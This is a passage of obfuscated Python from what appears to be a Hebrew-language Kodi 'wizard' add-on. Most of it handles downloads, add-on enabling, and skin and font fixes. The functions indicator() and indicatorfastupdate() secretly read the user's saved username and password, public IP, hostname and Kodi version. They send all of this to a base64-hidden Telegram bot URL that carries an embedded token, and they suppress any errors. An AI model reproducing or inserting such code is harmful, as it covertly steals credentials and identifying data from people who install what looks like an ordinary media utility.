        O00OO0O0O00OO0OOO .write (OO000OOO0OOOOOO00 )#line:3468
        if not O00O00OOO0OOOOOO0 :#line:3470
            OOOOO00OO0O000000 =OOOO0O0000OO00OOO #line:3471
        if OOO00O0O00000O00O .iscanceled ():#line:3472
           OOO00O0O00000O00O .close ()#line:3473
           try :#line:3474
            os .remove (OOO0O00OO0000O0O0 )#line:3475
           except :#line:3476
            pass #line:3477
           break #line:3478
        O0OOOOOOOOO000000 =float (OOOO0O0000OO00OOO )/OOOOO00OO0O000000 #line:3479
        O0OOOOOOOOO000000 =round (O0OOOOOOOOO000000 *100 ,2 )#line:3480
        OO0OOO0O000OOO00O =OOOO0O0000OO00OOO /(1024 *1024 )#line:3481
        OOOOOO0OOOO00O00O =OOOOO00OO0O000000 /(1024 *1024 )#line:3482
        O0O00000000O0OO00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0OOO0O000OOO00O ,'teal',OOOOOO0OOOO00O00O )#line:3483
        if (time .time ()-OOO00OOOOO0O000OO )>0 :#line:3484
          OOOOOO000OO0O0O00 =OOOO0O0000OO00OOO /(time .time ()-OOO00OOOOO0O000OO )#line:3485
          OOOOOO000OO0O0O00 =OOOOOO000OO0O0O00 /1024 #line:3486
        else :#line:3487
         OOOOOO000OO0O0O00 =0 #line:3488
        O0O00O00OOO00O000 ='KB'#line:3489
        if OOOOOO000OO0O0O00 >=1024 :#line:3490
           OOOOOO000OO0O0O00 =OOOOOO000OO0O0O00 /1024 #line:3491
           O0O00O00OOO00O000 ='MB'#line:3492
        if OOOOOO000OO0O0O00 >0 and not O0OOOOOOOOO000000 ==100 :#line:3493
            OOO000OOO00O00O0O =(OOOOO00OO0O000000 -OOOO0O0000OO00OOO )/OOOOOO000OO0O0O00 #line:3494
        else :#line:3495
            OOO000OOO00O00O0O =0 #line:3496
        OO0OOOO0000OO0O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOOOO000OO0O0O00 ,O0O00O00OOO00O000 )#line:3497
        OOO00O0O00000O00O .update (int (O0OOOOOOOOO000000 ),"Downloading "+name ,O0O00000000O0OO00 ,OO0OOOO0000OO0O00 )#line:3499
  O000O000000O000OO =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3502
  O00OO0O0O00OO0OOO .close ()#line:3504
  extract (OOO0O00OO0000O0O0 ,O000O000000O000OO ,OOO00O0O00000O00O )#line:3506
  if os .path .exists (O000O000000O000OO +'/scakemyer-script.quasar.burst'):#line:3507
    if os .path .exists (O000O000000O000OO +'/script.quasar.burst'):#line:3508
     shutil .rmtree (O000O000000O000OO +'/script.quasar.burst',ignore_errors =False )#line:3509
    os .rename (O000O000000O000OO +'/scakemyer-script.quasar.burst',O000O000000O000OO +'/script.quasar.burst')#line:3510
  if os .path .exists (O000O000000O000OO +'/plugin.video.kmediatorrent-master'):#line:3512
    if os .path .exists (O000O000000O000OO +'/plugin.video.kmediatorrent'):#line:3513
     shutil .rmtree (O000O000000O000OO +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3514
    os .rename (O000O000000O000OO +'/plugin.video.kmediatorrent-master',O000O000000O000OO +'/plugin.video.kmediatorrent')#line:3515
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3516
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3517
  try :#line:3518
    os .remove (OOO0O00OO0000O0O0 )#line:3519
  except :#line:3520
    pass #line:3521
  OOO00O0O00000O00O .close ()#line:3522
def dis_or_enable_addon (OOO0000O0OOOOOOO0 ,OOOO0OOOOOO00OO00 ,enable ="true"):#line:3523
    import json #line:3524
    O000OOOO0OO0OOO00 ='"%s"'%OOO0000O0OOOOOOO0 #line:3525
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO0000O0OOOOOOO0 )and enable =="true":#line:3526
        logging .warning ('already Enabled')#line:3527
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOO0000O0OOOOOOO0 )#line:3528
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO0000O0OOOOOOO0 )and enable =="false":#line:3529
        return xbmc .log ("### Skipped %s, reason = not installed"%OOO0000O0OOOOOOO0 )#line:3530
    else :#line:3531
        O0O0OOO0O00OOO00O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O000OOOO0OO0OOO00 ,enable )#line:3532
        O0OO00O0O000OO0OO =xbmc .executeJSONRPC (O0O0OOO0O00OOO00O )#line:3533
        OOOO0OOO000000O00 =json .loads (O0OO00O0O000OO0OO )#line:3534
        if enable =="true":#line:3535
            xbmc .log ("### Enabled %s, response = %s"%(OOO0000O0OOOOOOO0 ,OOOO0OOO000000O00 ))#line:3536
        else :#line:3537
            xbmc .log ("### Disabled %s, response = %s"%(OOO0000O0OOOOOOO0 ,OOOO0OOO000000O00 ))#line:3538
    if OOOO0OOOOOO00OO00 =='auto':#line:3539
     return True #line:3540
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3541
def chunk_report (O0O0O0OOO0O000000 ,OO0O00O0O0000OOO0 ,O0O0OO000OO00OO0O ):#line:3542
   O0OO0O000OOOOO0OO =float (O0O0O0OOO0O000000 )/O0O0OO000OO00OO0O #line:3543
   O0OO0O000OOOOO0OO =round (O0OO0O000OOOOO0OO *100 ,2 )#line:3544
   if O0O0O0OOO0O000000 >=O0O0OO000OO00OO0O :#line:3546
      sys .stdout .write ('\n')#line:3547
def chunk_read (O0OOO0O000OO0O0OO ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3549
   import time #line:3550
   O000OO0O0O000OO00 =int (filesize )*1000000 #line:3551
   O0O0OO00O000OOOOO =0 #line:3553
   OOO00O0O0OOOO0OO0 =time .time ()#line:3554
   OOOO0OO00OO0O0O0O =0 #line:3555
   logging .warning ('Downloading')#line:3557
   with open (destination ,"wb")as OOO0OO0O000O0O000 :#line:3558
    while 1 :#line:3559
      O00OOO00O0OOO0000 =time .time ()-OOO00O0O0OOOO0OO0 #line:3560
      OO00OO00OO000000O =int (OOOO0OO00OO0O0O0O *chunk_size )#line:3561
      OO0OO0OOOOO00O0O0 =O0OOO0O000OO0O0OO .read (chunk_size )#line:3562
      OOO0OO0O000O0O000 .write (OO0OO0OOOOO00O0O0 )#line:3563
      OOO0OO0O000O0O000 .flush ()#line:3564
      O0O0OO00O000OOOOO +=len (OO0OO0OOOOO00O0O0 )#line:3565
      OO00OOOO0000O0O0O =float (O0O0OO00O000OOOOO )/O000OO0O0O000OO00 #line:3566
      OO00OOOO0000O0O0O =round (OO00OOOO0000O0O0O *100 ,2 )#line:3567
      if int (O00OOO00O0OOO0000 )>0 :#line:3568
        O0000000O0O00O000 =int (OO00OO00OO000000O /(1024 *O00OOO00O0OOO0000 ))#line:3569
      else :#line:3570
         O0000000O0O00O000 =0 #line:3571
      if O0000000O0O00O000 >1024 and not OO00OOOO0000O0O0O ==100 :#line:3572
          O000O0000O00O00OO =int (((O000OO0O0O000OO00 -OO00OO00OO000000O )/1024 )/(O0000000O0O00O000 ))#line:3573
      else :#line:3574
          O000O0000O00O00OO =0 #line:3575
      if O000O0000O00O00OO <0 :#line:3576
        O000O0000O00O00OO =0 #line:3577
      dp .update (int (OO00OOOO0000O0O0O ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO00OOOO0000O0O0O ,OO00OO00OO000000O /(1024 *1024 ),O000OO0O0O000OO00 /(1000 *1000 ),O0000000O0O00O000 ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (O000O0000O00O00OO ,60 ))#line:3578
      if dp .iscanceled ():#line:3579
         dp .close ()#line:3580
         break #line:3581
      if not OO0OO0OOOOO00O0O0 :#line:3582
         break #line:3583
      if report_hook :#line:3585
         report_hook (O0O0OO00O000OOOOO ,chunk_size ,O000OO0O0O000OO00 )#line:3586
      OOOO0OO00OO0O0O0O +=1 #line:3587
   logging .warning ('END Downloading')#line:3588
   return O0O0OO00O000OOOOO #line:3589
def googledrive_download (O0OO00OO0OOO0000O ,O0O00O0OOOO00O00O ,OO0OOO00OOO0OOOOO ,O00O0000O0O0O0000 ):#line:3591
    OOOO0O000OO00O0OO =[]#line:3595
    O000O0O00O0OO00O0 =O0OO00OO0OOO0000O .split ('=')#line:3596
    O0OO00OO0OOO0000O =O000O0O00O0OO00O0 [len (O000O0O00O0OO00O0 )-1 ]#line:3597
    def OOOO0O0OOO0O0OOOO (O0OO00OOO0O00OO00 ):#line:3599
        for OO0OOOO000000OOO0 in O0OO00OOO0O00OO00 :#line:3601
            logging .warning ('cookie.name')#line:3602
            logging .warning (OO0OOOO000000OOO0 .name )#line:3603
            O0OO00O00O000OO0O =OO0OOOO000000OOO0 .value #line:3604
            if 'download_warning'in OO0OOOO000000OOO0 .name :#line:3605
                logging .warning (OO0OOOO000000OOO0 .value )#line:3606
                logging .warning ('cookie.value')#line:3607
                return OO0OOOO000000OOO0 .value #line:3608
            return O0OO00O00O000OO0O #line:3609
        return None #line:3611
    def O000000O00O0O00OO (O0O0O0O00OO00OO0O ,O000000O0O000O000 ):#line:3613
        OO00OOOOO0O0O0OOO =32768 #line:3615
        O0O00O0O000O0O000 =time .time ()#line:3616
        with open (O000000O0O000O000 ,"wb")as OO0OOO00OO0000OOO :#line:3618
            O00O0OOO0O00OO00O =1 #line:3619
            OO00OOOOOO00000O0 =32768 #line:3620
            try :#line:3621
                OO000000OOOOO0OOO =int (O0O0O0O00OO00OO0O .headers .get ('content-length'))#line:3622
                print ('file total size :',OO000000OOOOO0OOO )#line:3623
            except TypeError :#line:3624
                print ('using dummy length !!!')#line:3625
                OO000000OOOOO0OOO =int (O00O0000O0O0O0000 )*1000000 #line:3626
            for O0000OOO0000000O0 in O0O0O0O00OO00OO0O .iter_content (OO00OOOOO0O0O0OOO ):#line:3627
                if O0000OOO0000000O0 :#line:3628
                    OO0OOO00OO0000OOO .write (O0000OOO0000000O0 )#line:3629
                    OO0OOO00OO0000OOO .flush ()#line:3630
                    OOO0000OOO00O0OO0 =time .time ()-O0O00O0O000O0O000 #line:3631
                    OO0O00O0O0O0OOOOO =int (O00O0OOO0O00OO00O *OO00OOOOOO00000O0 )#line:3632
                    if OOO0000OOO00O0OO0 ==0 :#line:3633
                        OOO0000OOO00O0OO0 =0.1 #line:3634
                    OO0OO0OO00O000O00 =int (OO0O00O0O0O0OOOOO /(1024 *OOO0000OOO00O0OO0 ))#line:3635
                    OO0O0OOOO00OO000O =int (O00O0OOO0O00OO00O *OO00OOOOOO00000O0 *100 /OO000000OOOOO0OOO )#line:3636
                    if OO0OO0OO00O000O00 >1024 and not OO0O0OOOO00OO000O ==100 :#line:3637
                      O00O0O0O00000OOO0 =int (((OO000000OOOOO0OOO -OO0O00O0O0O0OOOOO )/1024 )/(OO0OO0OO00O000O00 ))#line:3638
                    else :#line:3639
                      O00O0O0O00000OOO0 =0 #line:3640
                    OO0OOO00OOO0OOOOO .update (int (OO0O0OOOO00OO000O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO0O0OOOO00OO000O ,OO0O00O0O0O0OOOOO /(1024 *1024 ),OO000000OOOOO0OOO /(1000 *1000 ),OO0OO0OO00O000O00 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O00O0O0O00000OOO0 ,60 ))#line:3642
                    O00O0OOO0O00OO00O +=1 #line:3643
                    if OO0OOO00OOO0OOOOO .iscanceled ():#line:3644
                     OO0OOO00OOO0OOOOO .close ()#line:3645
                     break #line:3646
    O0O0OO000OOOOO00O ="https://docs.google.com/uc?export=download"#line:3647
    import urllib2 #line:3652
    import cookielib #line:3653
    from cookielib import CookieJar #line:3655
    O0O0O0O00OO00O0O0 =CookieJar ()#line:3657
    OOO0OOOOO0O0OOO0O =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0O0O0O00OO00O0O0 ))#line:3658
    O000OO00O0O000OOO ={'id':O0OO00OO0OOO0000O }#line:3660
    O0O00O00O00O00OO0 =urllib .urlencode (O000OO00O0O000OOO )#line:3661
    logging .warning (O0O0OO000OOOOO00O +'&'+O0O00O00O00O00OO0 )#line:3662
    O00000OOOO0OOOO0O =OOO0OOOOO0O0OOO0O .open (O0O0OO000OOOOO00O +'&'+O0O00O00O00O00OO0 )#line:3663
    OO00OOOOO0OOO0O0O =O00000OOOO0OOOO0O .read ()#line:3664
    for O0OO00000OOO0OO0O in O0O0O0O00OO00O0O0 :#line:3666
         logging .warning (O0OO00000OOO0OO0O )#line:3667
    OO0OOOOOO00OO0O0O =OOOO0O0OOO0O0OOOO (O0O0O0O00OO00O0O0 )#line:3668
    logging .warning (OO0OOOOOO00OO0O0O )#line:3669
    if OO0OOOOOO00OO0O0O :#line:3670
        O0O0O0OO0OOOO0O00 ={'id':O0OO00OO0OOO0000O ,'confirm':OO0OOOOOO00OO0O0O }#line:3671
        OO0OOOO0OOOOOOO00 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3672
        O0O00O00O00O00OO0 =urllib .urlencode (O0O0O0OO0OOOO0O00 )#line:3673
        O00000OOOO0OOOO0O =OOO0OOOOO0O0OOO0O .open (O0O0OO000OOOOO00O +'&'+O0O00O00O00O00OO0 )#line:3674
        chunk_read (O00000OOOO0OOOO0O ,report_hook =chunk_report ,dp =OO0OOO00OOO0OOOOO ,destination =O0O00O0OOOO00O00O ,filesize =O00O0000O0O0O0000 )#line:3675
    return (OOOO0O000OO00O0OO )#line:3679
def kodi17Fix ():#line:3680
	OOOO0O0O0OOOOO000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3681
	O00OO0O00O000OOO0 =[]#line:3682
	for OO0O000OOOO0OO0O0 in sorted (OOOO0O0O0OOOOO000 ,key =lambda O0000O00000O0OO0O :O0000O00000O0OO0O ):#line:3683
		O000O000OO0O0000O =os .path .join (OO0O000OOOO0OO0O0 ,'addon.xml')#line:3684
		if os .path .exists (O000O000OO0O0000O ):#line:3685
			O0O000O0O00O0OOOO =OO0O000OOOO0OO0O0 .replace (ADDONS ,'')[1 :-1 ]#line:3686
			OOOOO0O0O0OO0OO0O =open (O000O000OO0O0000O )#line:3687
			OOO000000OO0O0O00 =OOOOO0O0O0OO0OO0O .read ()#line:3688
			O0000OO0O00000000 =parseDOM (OOO000000OO0O0O00 ,'addon',ret ='id')#line:3689
			OOOOO0O0O0OO0OO0O .close ()#line:3690
			try :#line:3691
				OO0OOOO0O00OOOOO0 =xbmcaddon .Addon (id =O0000OO0O00000000 [0 ])#line:3692
			except :#line:3693
				try :#line:3694
					log ("%s was disabled"%O0000OO0O00000000 [0 ],xbmc .LOGDEBUG )#line:3695
					O00OO0O00O000OOO0 .append (O0000OO0O00000000 [0 ])#line:3696
				except :#line:3697
					try :#line:3698
						log ("%s was disabled"%O0O000O0O00O0OOOO ,xbmc .LOGDEBUG )#line:3699
						O00OO0O00O000OOO0 .append (O0O000O0O00O0OOOO )#line:3700
					except :#line:3701
						if len (O0000OO0O00000000 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O0O000O0O00O0OOOO ,xbmc .LOGERROR )#line:3702
						else :log ("Unabled to enable: %s"%OO0O000OOOO0OO0O0 ,xbmc .LOGERROR )#line:3703
	if len (O00OO0O00O000OOO0 )>0 :#line:3704
		O0OOO0O00OO0O0O00 =0 #line:3705
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3706
		for OOO0OOO0O00000OOO in O00OO0O00O000OOO0 :#line:3707
			O0OOO0O00OO0O0O00 +=1 #line:3708
			O000O0O00OO0OOOOO =int (percentage (O0OOO0O00OO0O0O00 ,len (O00OO0O00O000OOO0 )))#line:3709
			DP .update (O000O0O00OO0OOOOO ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OOO0O00000OOO ))#line:3710
			addonDatabase (OOO0OOO0O00000OOO ,1 )#line:3711
			if DP .iscanceled ():break #line:3712
		if DP .iscanceled ():#line:3713
			DP .close ()#line:3714
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3715
			sys .exit ()#line:3716
		DP .close ()#line:3717
	forceUpdate ()#line:3718
def indicator ():#line:3720
       try :#line:3721
          import json #line:3722
          wiz .log ('FRESH MESSAGE')#line:3723
          O0OO00OOOO0O0O000 =(ADDON .getSetting ("user"))#line:3724
          OOOO0O00O0OO0O000 =(ADDON .getSetting ("pass"))#line:3725
          OOO0OOO0O0OO0O000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3726
          OO000OOO00OOO0OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3727
          O00OOO00OOO00000O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3728
          OO0O00O00OO0OOO0O =str (json .loads (O00OOO00OOO00000O )['ip'])#line:3729
          O0O0OOOOO000O00OO =O0OO00OOOO0O0O000 #line:3730
          OO0000O00O0OOOOO0 =OOOO0O00O0OO0O000 #line:3731
          import socket #line:3732
          O00OOO00OOO00000O =urllib2 .urlopen (OO000OOO00OOO0OO0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0O0OOOOO000O00OO +' - '+OO0000O00O0OOOOO0 +' - '+OOO0OOO0O0OO0O000 +' - '+OO0O00O00OO0OOO0O ).readlines ()#line:3733
       except :pass #line:3735
def indicatorfastupdate ():#line:3737
       try :#line:3738
          import json #line:3739
          wiz .log ('FRESH MESSAGE')#line:3740
          O00O0O0O00OO0OOO0 =(ADDON .getSetting ("user"))#line:3741
          OOOO0000O00O0000O =(ADDON .getSetting ("pass"))#line:3742
          O0000OOO000O00000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3743
          OO00OO0OO0OO000O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3745
          OOOO00OOO0O0O0000 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3746
          O00O0OOO00O000OOO =str (json .loads (OOOO00OOO0O0O0000 )['ip'])#line:3747
          OOOO0O0O00OOO0000 =O00O0O0O00OO0OOO0 #line:3748
          OOOO00OO0O000O00O =OOOO0000O00O0000O #line:3749
          import socket #line:3751
          OOOO00OOO0O0O0000 =urllib2 .urlopen (OO00OO0OO0OO000O0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOOO0O0O00OOO0000 +' - '+OOOO00OO0O000O00O +' - '+O0000OOO000O00000 +' - '+O00O0OOO00O000OOO ).readlines ()#line:3752
       except :pass #line:3754
def skinfix18 ():#line:3756
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3757
		O00O0O0OO0OO00OOO =wiz .workingURL (SKINID18DDONXML )#line:3758
		if O00O0O0OO0OO00OOO ==True :#line:3759
			OOOOOOOOO0O0O0000 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3760
			if len (OOOOOOOOO0O0O0000 )>0 :#line:3761
				OOO000O0O00O0OO0O ='%s-%s.zip'%(SKINID18 ,OOOOOOOOO0O0O0000 [0 ])#line:3762
				O0O00000OOO0OO0OO =wiz .workingURL (SKIN18ZIPURL +OOO000O0O00O0OO0O )#line:3763
				if O0O00000OOO0OO0OO ==True :#line:3764
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3765
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3766
					O00OOO0O000O0OO0O =os .path .join (PACKAGES ,OOO000O0O00O0OO0O )#line:3767
					try :os .remove (O00OOO0O000O0OO0O )#line:3768
					except :pass #line:3769
					downloader .download (SKIN18ZIPURL +OOO000O0O00O0OO0O ,O00OOO0O000O0OO0O ,DP )#line:3770
					extract .all (O00OOO0O000O0OO0O ,HOME ,DP )#line:3771
					try :#line:3772
						OO0OOO0OOOOO00O0O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3773
						O0O0OO0OO00O0OOO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3774
						os .rename (OO0OOO0OOOOO00O0O ,O0O0OO0OO00O0OOO0 )#line:3775
					except :#line:3776
						pass #line:3777
					try :#line:3778
						OO0O0OOO0OO0OO0OO =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OOO0O0O0O000000O0 =OO0O0OOO0OO0OO0OO .read ();OO0O0OOO0OO0OO0OO .close ()#line:3779
						O0OOO0OO0OO0O0OOO =wiz .parseDOM (OOO0O0O0O000000O0 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3780
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOO0OO0OO0O0OOO [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3781
					except :#line:3782
						pass #line:3783
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3784
					DP .close ()#line:3785
					xbmc .sleep (500 )#line:3786
					wiz .forceUpdate (True )#line:3787
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3788
				else :#line:3789
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3790
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0O00000OOO0OO0OO ,xbmc .LOGERROR )#line:3791
			else :#line:3792
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3793
		else :#line:3794
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3795
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3796
def skinfix17 ():#line:3797
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3798
		OOO0000O0OO0OOO0O =wiz .workingURL (SKINID17DDONXML )#line:3799
		if OOO0000O0OO0OOO0O ==True :#line:3800
			O00OO00O0OOOO0000 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3801
			if len (O00OO00O0OOOO0000 )>0 :#line:3802
				O00OOO0O0OO0O0O0O ='%s-%s.zip'%(SKINID17 ,O00OO00O0OOOO0000 [0 ])#line:3803
				OOO0000000OO00000 =wiz .workingURL (SKIN17ZIPURL +O00OOO0O0OO0O0O0O )#line:3804
				if OOO0000000OO00000 ==True :#line:3805
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3806
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3807
					OO00O0OOOOO000O00 =os .path .join (PACKAGES ,O00OOO0O0OO0O0O0O )#line:3808
					try :os .remove (OO00O0OOOOO000O00 )#line:3809
					except :pass #line:3810
					downloader .download (SKIN17ZIPURL +O00OOO0O0OO0O0O0O ,OO00O0OOOOO000O00 ,DP )#line:3811
					extract .all (OO00O0OOOOO000O00 ,HOME ,DP )#line:3812
					try :#line:3813
						OOOOO0OO0O00O0O0O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3814
						OOO00000OO0000000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3815
						os .rename (OOOOO0OO0O00O0O0O ,OOO00000OO0000000 )#line:3816
					except :#line:3817
						pass #line:3818
					try :#line:3819
						O000000OO00000OO0 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O00O0O00OO000OO0O =O000000OO00000OO0 .read ();O000000OO00000OO0 .close ()#line:3820
						OOOO0O00OO0OOO000 =wiz .parseDOM (O00O0O00OO000OO0O ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3821
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0O00OO0OOO000 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3822
					except :#line:3823
						pass #line:3824
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3825
					DP .close ()#line:3826
					xbmc .sleep (500 )#line:3827
					wiz .forceUpdate (True )#line:3828
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3829
				else :#line:3830
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3831
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OOO0000000OO00000 ,xbmc .LOGERROR )#line:3832
			else :#line:3833
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3834
		else :#line:3835
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3836
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3837
def fix17update ():#line:3838
	if KODIV >=17 and KODIV <18 :#line:3839
		wiz .kodi17Fix ()#line:3840
		xbmc .sleep (4000 )#line:3841
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3842
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3843
		fixfont ()#line:3844
		O0OO000OO0OO0O0O0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3845
		try :#line:3847
			O0OO0O0000OO0OO0O =open (O0OO000OO0OO0O0O0 ,'r')#line:3848
			OOOO00OOO0OOO0000 =O0OO0O0000OO0OO0O .read ()#line:3849
			O0OO0O0000OO0OO0O .close ()#line:3850
			O0000O000O00OOO00 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3851
			O00O000OO0000OO00 =re .compile (O0000O000O00OOO00 ).findall (OOOO00OOO0OOO0000 )[0 ]#line:3852
			O0OO0O0000OO0OO0O =open (O0OO000OO0OO0O0O0 ,'w')#line:3853
			O0OO0O0000OO0OO0O .write (OOOO00OOO0OOO0000 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O00O000OO0000OO00 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3854
			O0OO0O0000OO0OO0O .close ()#line:3855
		except :#line:3856
				pass #line:3857
		wiz .kodi17Fix ()#line:3858
		O0OO000OO0OO0O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3859
		try :#line:3860
			O0OO0O0000OO0OO0O =open (O0OO000OO0OO0O0O0 ,'r')#line:3861
			OOOO00OOO0OOO0000 =O0OO0O0000OO0OO0O .read ()#line:3862
			O0OO0O0000OO0OO0O .close ()#line:3863
			O0000O000O00OOO00 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3864
			O00O000OO0000OO00 =re .compile (O0000O000O00OOO00 ).findall (OOOO00OOO0OOO0000 )[0 ]#line:3865
			O0OO0O0000OO0OO0O =open (O0OO000OO0OO0O0O0 ,'w')#line:3866
			O0OO0O0000OO0OO0O .write (OOOO00OOO0OOO0000 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O00O000OO0000OO00 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3867
			O0OO0O0000OO0OO0O .close ()#line:3868
		except :#line:3869
				pass #line:3870
		swapSkins ('skin.Premium.mod')#line:3871
def fix18update ():#line:3873
	if KODIV >=18 :#line:3874
		xbmc .sleep (4000 )#line:3875
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3876
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3877
		fixfont ()#line:3878
		O00OO0O0OOO00OO0O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3879
		try :#line:3880
			O00OOO0OO0OO000O0 =open (O00OO0O0OOO00OO0O ,'r')#line:3881
			OO00O00O000OO000O =O00OOO0OO0OO000O0 .read ()#line:3882
